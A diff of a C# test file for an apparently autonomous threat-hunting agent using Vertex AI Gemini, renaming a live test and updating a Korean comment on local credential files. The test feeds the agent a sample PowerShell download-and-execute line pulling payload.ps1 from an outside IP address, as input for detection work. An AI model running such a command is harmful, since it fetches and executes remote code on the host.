@@ -335,7 +335,7 @@ public class AutonomousHunterAgentTests
 
     [Fact]
     [Trait("Category", "Live")]
-    public async Task TestLiveAutonomousInvestigationWithMvCredentials()
+    public async Task TestLiveAutonomousInvestigationWithLocalCredentials()
     {
         var treeManager = new ProcessTreeProjectionManager();
         var archiveManager = ForensicArchiveManager.CreateInMemory();
@@ -348,7 +348,7 @@ public class AutonomousHunterAgentTests
             new SystemFirewallTool()
         };
 
-        // MV 인증정보로 실제 Vertex AI Gemini 클라이언트 자동 연결
+        // Phalanx 로컬 인증정보(Config/google-credentials.json 또는 AppSettings.json)로 실제 Vertex AI Gemini 클라이언트 자동 연결
         var agent = new AutonomousHunterAgent(treeManager, archiveManager, tools);
 
         string rawScript = "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://185.220.101.5/payload.ps1')";
